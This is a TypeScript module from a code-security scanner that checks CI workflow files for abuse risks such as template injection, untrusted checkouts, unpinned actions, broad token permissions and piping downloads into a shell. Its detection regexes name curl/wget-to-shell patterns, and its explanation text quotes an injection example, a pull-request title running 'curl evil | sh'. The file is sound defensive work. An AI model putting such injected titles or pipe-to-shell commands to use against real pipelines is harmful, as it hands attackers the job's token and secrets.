import type { BriefingFacts } from "../codebase-briefing/facts.js";
import type { FindingEvidence } from "../findings/model.js";
import { secFinding } from "./rules.js";
import type { SecurityFinding } from "./types.js";

/**
 * CI/CD pipeline security, from the workflow files themselves (3.5 checks
 * which quality gates exist; this checks whether the pipeline can be
 * abused). GitHub Actions rules follow Skylos' D290–D312 family; GitLab
 * rules cover the common subset.
 */

type Hit = { rule: string; path: string; line: number; detail: string; severity?: SecurityFinding["severity"] };

/** Event fields an outside contributor controls. */
const UNTRUSTED_CONTEXT = /\$\{\{\s*(?:github\.event\.(?:issue\.(?:title|body)|pull_request\.(?:title|body|head\.ref|head\.label|head\.repo\.default_branch)|comment\.body|review\.body|review_comment\.body|pages\.[^}]*\.page_name|commits\.[^}]*\.(?:message|author\.(?:email|name))|head_commit\.(?:message|author\.(?:email|name))|discussion\.(?:title|body)|workflow_run\.(?:head_branch|head_commit\.message))|github\.head_ref)\s*\}\}/;

export function analyzeCicd(facts: BriefingFacts, skip: (p: string) => boolean): { findings: SecurityFinding[]; files: number } {
  const files = facts.configOf("ci").map((c) => c.path).filter((p) => !skip(p));
  const hits: Hit[] = [];
  for (const p of files) {
    const lines = facts.lines(p);
    if (p.startsWith(".github/workflows/")) hits.push(...githubActions(p, lines));
    else if (/gitlab-ci/.test(p)) hits.push(...gitlab(p, lines));
    else hits.push(...generic(p, lines));
  }
  return { findings: group(hits), files: files.length };
}

function githubActions(path: string, lines: readonly string[]): Hit[] {
  const out: Hit[] = [];
  const text = lines.join("\n");
  const prTarget = /^\s*(?:on:\s*\[?[^\n]*\bpull_request_target\b|pull_request_target\s*:)/m.test(text) || /^on:\s*pull_request_target/m.test(text);
  const workflowRun = /^\s*workflow_run\s*:/m.test(text);
  const untrustedEvents = /\bpull_request(?:_target)?\b|\bissue_comment\b|\bissues\b|\bdiscussion\b|\bfork\b/.test(text.split(/^jobs:/m)[0] ?? "");
  const hasTopPermissions = /^permissions:/m.test(text);
  let inRun = false;
  let runIndent = 0;
  lines.forEach((raw, i) => {
    const l = raw.replace(/\s+#.*$/, "");
    const line = i + 1;
    const indent = l.length - l.trimStart().length;
    if (/^\s*-?\s*run:\s*[|>]?/.test(l)) {
      inRun = /run:\s*[|>]-?\s*$/.test(l);
      runIndent = indent;
      if (UNTRUSTED_CONTEXT.test(l)) out.push({ rule: "sec/ci-template-injection", path, line, detail: `run: interpolates ${UNTRUSTED_CONTEXT.exec(l)![0]}` });
    } else if (inRun) {
      if (l.trim() && indent <= runIndent) inRun = false;
      else if (UNTRUSTED_CONTEXT.test(l)) out.push({ rule: "sec/ci-template-injection", path, line, detail: `run script interpolates ${UNTRUSTED_CONTEXT.exec(l)![0]}` });
    }
    if (/^\s*script:\s*[|>]?/.test(l) && UNTRUSTED_CONTEXT.test(lines.slice(i, i + 15).join("\n"))) out.push({ rule: "sec/ci-template-injection", path, line, detail: "actions/github-script body interpolates untrusted event data" });
    if ((prTarget || workflowRun) && /ref:\s*\$\{\{\s*github\.(?:event\.pull_request\.head\.(?:sha|ref)|head_ref|event\.workflow_run\.head_(?:sha|branch))/.test(l)) out.push({ rule: "sec/ci-untrusted-checkout", path, line, detail: `${prTarget ? "pull_request_target" : "workflow_run"} checks out the contributor's code (${l.trim()})`, severity: "critical" });
    const uses = /^\s*-?\s*uses:\s*([^\s@]+)@([^\s]+)/.exec(l);
    if (uses && !uses[1]!.startsWith("./") && !uses[1]!.startsWith("docker://") && !/^[0-9a-f]{40}$/.test(uses[2]!)) out.push({ rule: "sec/ci-unpinned-action", path, line, detail: `${uses[1]}@${uses[2]}`, severity: /^(?:actions|github)\//.test(uses[1]!) ? "info" : "low" });
    if (/^\s*permissions:\s*write-all\b/.test(l)) out.push({ rule: "sec/ci-permissions", path, line, detail: "permissions: write-all", severity: "high" });
    if (/^\s*(?:contents|packages|actions|id-token|pull-requests|deployments|security-events):\s*write\b/.test(l) && (prTarget || untrustedEvents)) out.push({ rule: "sec/ci-permissions", path, line, detail: `${l.trim()} in a workflow triggered by untrusted events` });
    if (/\becho\b[^\n]*\$\{\{\s*secrets\.[A-Z0-9_]+\s*\}\}/.test(l)) out.push({ rule: "sec/ci-secret-exposure", path, line, detail: "a secret is echoed into the log" });
    if (/^\s*secrets:\s*inherit\b/.test(l)) out.push({ rule: "sec/ci-secret-exposure", path, line, detail: "secrets: inherit passes every secret to the called workflow", severity: "low" });
    if (/runs-on:\s*\[?[^\n]*self-hosted/.test(l) && untrustedEvents) out.push({ rule: "sec/ci-self-hosted", path, line, detail: "self-hosted runner in a workflow triggered by pull requests or issues" });
    if (/\b(?:curl|wget)\b[^|\n]*\|\s*(?:sudo\s+)?(?:ba|z)?sh\b/.test(l)) out.push({ rule: "sec/ci-pipe-to-shell", path, line, detail: l.trim().slice(0, 120) });
    if (/uses:\s*actions\/checkout@/.test(l) && !lines.slice(i + 1, i + 8).some((x) => /persist-credentials:\s*false/.test(x)) && /git\s+push|gh\s+pr|git\s+commit/.test(text) === false && prTarget) out.push({ rule: "sec/ci-persisted-credentials", path, line, detail: "checkout keeps the token in .git/config for later steps" });
    if (/uses:\s*actions\/cache@/.test(l) && prTarget) out.push({ rule: "sec/ci-untrusted-checkout", path, line, detail: "cache written from a pull_request_target run can poison later trusted runs", severity: "medium" });
  });
  if (!hasTopPermissions && (untrustedEvents || prTarget)) out.push({ rule: "sec/ci-permissions", path, line: 1, detail: "no top-level permissions: the default GITHUB_TOKEN scope applies (write in older repositories)", severity: "low" });
  return out;
}

function gitlab(path: string, lines: readonly string[]): Hit[] {
  const out: Hit[] = [];
  lines.forEach((raw, i) => {
    const l = raw.replace(/\s+#.*$/, "");
    if (/\$CI_(?:MERGE_REQUEST_(?:TITLE|DESCRIPTION|SOURCE_BRANCH_NAME)|COMMIT_(?:MESSAGE|TITLE|DESCRIPTION|BRANCH|REF_NAME))\b/.test(l) && /\beval\b|\bsh\s+-c\b|\$\(\s*\$CI_/.test(l)) out.push({ rule: "sec/ci-template-injection", path, line: i + 1, detail: "user-controlled CI variable evaluated by the shell" });
    const img = /^\s*image:\s*["']?([^"'\s]+)/.exec(l);
    if (img && !img[1]!.includes("@sha256:") && !img[1]!.includes("$") && (!img[1]!.split("/").pop()!.includes(":") || img[1]!.endsWith(":latest"))) out.push({ rule: "sec/ci-unpinned-action", path, line: i + 1, detail: `image ${img[1]} is mutable` });
    if (/\b(?:curl|wget)\b[^|\n]*\|\s*(?:sudo\s+)?(?:ba|z)?sh\b/.test(l)) out.push({ rule: "sec/ci-pipe-to-shell", path, line: i + 1, detail: l.trim().slice(0, 120) });
    if (/^\s*-\s*project:|^\s*remote:\s*https?:/.test(l) && !lines.slice(i, i + 4).some((x) => /\bref:\s*["']?[0-9a-f]{40}/.test(x))) out.push({ rule: "sec/ci-unpinned-action", path, line: i + 1, detail: "include without a pinned commit" });
    if (/DOCKER_TLS_CERTDIR:\s*["']{2}/.test(l)) out.push({ rule: "sec/ci-permissions", path, line: i + 1, detail: "Docker-in-Docker with TLS disabled" });
  });
  return out;
}

function generic(path: string, lines: readonly string[]): Hit[] {
  const out: Hit[] = [];
  lines.forEach((l, i) => {
    if (/\b(?:curl|wget)\b[^|\n]*\|\s*(?:sudo\s+)?(?:ba|z)?sh\b/.test(l)) out.push({ rule: "sec/ci-pipe-to-shell", path, line: i + 1, detail: l.trim().slice(0, 120) });
  });
  return out;
}

const TEXT: Record<string, { title: (n: number) => string; why: string; action: string }> = {
  "sec/ci-untrusted-checkout": { title: (n) => `${n} ${n === 1 ? "workflow runs" : "workflows run"} contributor code with repository privileges`, why: "pull_request_target and workflow_run run with secrets and a write token; checking out the pull request's code hands both to whoever opened it.", action: "Use pull_request for untrusted code, or split into an unprivileged build and a privileged job that never executes PR code." },
  "sec/ci-template-injection": { title: (n) => `${n} CI ${n === 1 ? "script interpolates" : "scripts interpolate"} attacker-controlled text`, why: "${{ … }} is substituted before the shell runs, so a pull-request title like `\"; curl evil | sh` becomes code with the job's token and secrets.", action: "Pass the value through an environment variable (env: TITLE: ${{ … }}) and reference \"$TITLE\" in the script." },
  "sec/ci-permissions": { title: (n) => `${n} excessive or default workflow ${n === 1 ? "permission" : "permissions"}`, why: "A broad GITHUB_TOKEN turns any compromised step into repository write access.", action: "Declare `permissions: contents: read` at the top and grant writes per job only where needed." },
  "sec/ci-unpinned-action": { title: (n) => `${n} ${n === 1 ? "action or image is" : "actions or images are"} not pinned to a commit`, why: "A tag can be moved to malicious code (as in the tj-actions compromise); a commit SHA cannot.", action: "Pin third-party actions to a full commit SHA (keep the tag in a comment) and let Dependabot update them." },
  "sec/ci-secret-exposure": { title: (n) => `${n} ${n === 1 ? "secret is" : "secrets are"} exposed more widely than needed`, why: "Masking is best-effort; echoed or broadly inherited secrets leak through logs and called workflows.", action: "Pass only the secrets a job needs, and never echo them." },
  "sec/ci-self-hosted": { title: (n) => `${n} self-hosted ${n === 1 ? "runner handles" : "runners handle"} untrusted events`, why: "Code from a pull request runs on your machine and can persist there.", action: "Use GitHub-hosted runners for untrusted events, or ephemeral isolated self-hosted runners." },
  "sec/ci-pipe-to-shell": { title: (n) => `${n} remote ${n === 1 ? "script is" : "scripts are"} piped straight into a shell`, why: "Whatever the server returns at run time is executed with the pipeline's credentials.", action: "Download a pinned version, verify its checksum, then run it." },
  "sec/ci-persisted-credentials": { title: (n) => `${n} ${n === 1 ? "checkout keeps" : "checkouts keep"} the token on disk`, why: "Later steps, including third-party actions, can read the token from .git/config.", action: "Set persist-credentials: false on actions/checkout." },
};

function group(hits: Hit[]): SecurityFinding[] {
  const by = new Map<string, Hit[]>();
  for (const h of hits) by.set(h.rule, [...(by.get(h.rule) ?? []), h]);
  const rank = { critical: 0, high: 1, medium: 2, low: 3, info: 4 } as const;
  return [...by].map(([rule, list]) => {
    const t = TEXT[rule]!;
    const worst = list.map((h) => h.severity).filter((s): s is NonNullable<typeof s> => Boolean(s)).sort((a, b) => rank[a] - rank[b])[0];
    const base = secFinding(rule, { id: `sec:${rule.slice(4)}`, title: t.title(list.length), message: `${list.length} ${list.length === 1 ? "occurrence" : "occurrences"} in ${[...new Set(list.map((h) => h.path))].join(", ")}.`, why: t.why, action: t.action, confidence: "verified", ...(list.length === 1 ? { file: list[0]!.path, line: list[0]!.line } : {}), evidence: list.map((h): FindingEvidence => ({ type: "config", path: h.path, line: h.line, detail: h.detail })) });
    // Rule default unless an occurrence says otherwise (worse or, for all-first-party pins, milder).
    if (worst && (list.every((h) => h.severity) || rank[worst] < rank[base.severity])) base.severity = worst;
    return base;
  });
}
